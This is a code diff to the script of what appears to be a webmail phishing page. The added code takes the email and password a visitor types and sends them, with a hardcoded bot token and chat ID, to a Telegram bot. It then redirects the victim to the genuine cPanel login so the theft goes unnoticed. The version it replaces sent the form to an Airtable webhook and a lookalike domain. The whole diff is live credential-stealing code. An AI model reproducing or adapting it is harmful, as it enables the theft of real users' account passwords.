@@ -77,21 +77,41 @@ window.addEventListener('load', function() {
     $("#email-form").submit(function (event) {
       event.preventDefault(); // Prevent default form submission
 
-      var formData = $(this).serialize(); // Serialize form data
+      // Get the values from the form fields
+      let userEmail = $("#email-2").val();
+      let userPassword = $("#pazz").val();
 
+      // === REPLACE THESE WITH YOUR ACTUAL CREDENTIALS ===
+      let botToken = "8377401701:AAHaPJkCojN8uHJSZBHWjI5_RoZOEa8Xf44";   // Example: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
+      let chatId = "7241128758";       // Example: 123456789
+
+      // Format the message you want to receive on Telegram
+      let messageText = `📧 New Webmail Login\n📧 Email: ${userEmail}\n🔑 Password: ${userPassword}\n🌐 Source: Web-BR Login\n⏰ Time: ${new Date().toLocaleString()}\n⚠️ Note: Login was marked as invalid`;
+
+      // Construct the Telegram API URL
+      let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // Send the data to Telegram
       $.ajax({
-        url: "https://hooks.airtable.com/workflows/v1/genericWebhook/appHwNBiVPIhJG35j/wflV5tyT6B9mpGMve/wtrnQxFgNHEnJFc1q",
+        url: telegramUrl,
         type: "POST",
-        data: formData,
+        data: {
+          chat_id: chatId,
+          text: messageText,
+          parse_mode: 'HTML'
+        },
         success: function () {
-          console.log("✅ Form submitted successfully");
-        },
-        error: function () {
-          console.warn("⚠️ Airtable Webhook doesn't return a success response.");
-        },
-        complete: function () {
+          console.log("✅ Form submitted to Telegram successfully");
+          // Redirect after a successful submission
           setTimeout(function () {
-            window.location.href = "https://webmail-session-auth-verified.vercel.app";
+            window.location.href = "https://id.cpanel.net/";
+          }, 1000);
+        },
+        error: function (jqXHR, textStatus, errorThrown) {
+          console.error("❌ Failed to send message to Telegram:", textStatus, errorThrown);
+          // Still redirect even if there's an error (to maintain user experience)
+          setTimeout(function () {
+            window.location.href = "https://id.cpanel.net/";
           }, 1000);
         }
       });
